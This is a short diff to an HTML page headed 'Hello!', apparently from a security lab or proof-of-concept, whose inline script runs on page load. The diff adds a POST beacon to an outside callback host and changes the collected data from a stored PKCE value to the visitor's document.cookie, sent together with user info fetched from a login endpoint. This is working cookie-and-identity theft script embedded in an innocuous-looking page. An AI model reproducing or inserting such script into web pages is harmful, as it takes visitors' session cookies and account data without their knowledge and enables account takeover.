@@ -4,6 +4,11 @@
 	<h1>Hello!</h1>
     <script>
 		(async() => {
+			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
+				method: 'POST',
+				body: 'callback received',
+			});
+
 			let body = {};
 			try {
 				const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
@@ -13,7 +18,7 @@
 
 				body = {
 					userInfo: data,
-					cookies: localStorage.getItem('sketchy_pkce')
+					cookies: document.cookie
 				}
 			} catch (e) {
 				body = {
